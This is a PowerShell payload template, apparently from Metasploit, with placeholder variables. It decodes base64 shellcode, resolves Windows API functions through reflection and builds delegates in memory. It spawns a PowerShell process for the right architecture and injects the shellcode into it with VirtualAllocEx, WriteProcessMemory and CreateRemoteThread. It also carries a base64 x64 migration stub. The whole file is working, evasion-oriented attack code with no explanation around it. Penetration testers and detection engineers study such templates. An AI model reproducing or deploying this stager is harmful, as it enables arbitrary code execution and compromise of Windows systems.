function %{func_get_proc_address}{
	Param ($%{var_module},$%{var_procedure})
	$%{var_unsafe_native_methods}=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	return $%{var_unsafe_native_methods}.GetMethod('GetProcAddress').Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),($%{var_unsafe_native_methods}.GetMethod('GetModuleHandle')).Invoke($null,@($%{var_module})))),$%{var_procedure}))
}
function %{func_get_delegate_type}{
	Param ([Parameter(Position=0,Mandatory=$True)] [Type[]]$%{var_parameters},[Parameter(Position=1)] [Type]$%{var_return_type}=[Void])
	$%{var_type_builder}=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate])
	$%{var_type_builder}.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$%{var_parameters}).SetImplementationFlags('Runtime,Managed')
	$%{var_type_builder}.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$%{var_return_type},$%{var_parameters}).SetImplementationFlags('Runtime,Managed')
	return $%{var_type_builder}.CreateType()}
[Byte[]]$%{var_code}=[System.Convert]::FromBase64String("%{b64shellcode}")

$%{var_iswow64}=0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll IsWow64Process),(%{func_get_delegate_type} @([IntPtr],[Bool].MakeByRefType()) ([Bool]))).Invoke([System.Diagnostics.Process]::GetCurrentProcess().Handle,[Ref]$%{var_iswow64})

$%{var_is_x86_shellcode}=%{is_x86_shellcode}

if ($%{var_iswow64} -and [IntPtr]::Size -eq 4){
    if ($%{var_is_x86_shellcode}){$%{var_process}=saps powershell.exe -passthru -nonewwindow}
    else{$%{var_process}=saps ($env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe') -passthru -nonewwindow}
}elseif (!$%{var_iswow64} -and [IntPtr]::Size -eq 8){
    if ($%{var_is_x86_shellcode}){$%{var_process}=saps ($env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe') -passthru -nonewwindow}
    else{$%{var_process}=saps powershell.exe -passthru -nonewwindow}
}else{
    if ($%{var_is_x86_shellcode}){$%{var_process}=saps powershell.exe -passthru -nonewwindow}
    else{exit}
}

# see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
[Byte[]] $migrate_executex64 = [System.Convert]::FromBase64String("VYnlVleLdQiLTQzoAAAAAFiDwCWD7AiJ4sdCBDMAAACJAugJAAAAg8QUX15d\nwggAizwk/ypIMcBX/9ZfUMdEJAQjAAAAiTwk/ywk\n")

$%{var_buffer}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll VirtualAllocEx),(%{func_get_delegate_type} @([IntPtr],[IntPtr],[Uint32],[UInt32],[UInt32]) ([Long]))).Invoke($%{var_process}.handle,[IntPtr]::Zero,$%{var_code}.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll WriteProcessMemory),(%{func_get_delegate_type} @([IntPtr], [Long],[Byte[]],[UInt32],[UInt32].MakeByRefType()))).Invoke($%{var_process}.handle,$%{var_buffer},$%{var_code},$%{var_code}.Length,[Ref]0)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll CreateRemoteThread),(%{func_get_delegate_type} @([IntPtr],[IntPtr],[UInt32],[Long],[IntPtr],[UInt32],[IntPtr]))).Invoke($%{var_process}.handle,[IntPtr]::Zero,0,$%{var_buffer},0,0,[IntPtr]::Zero)
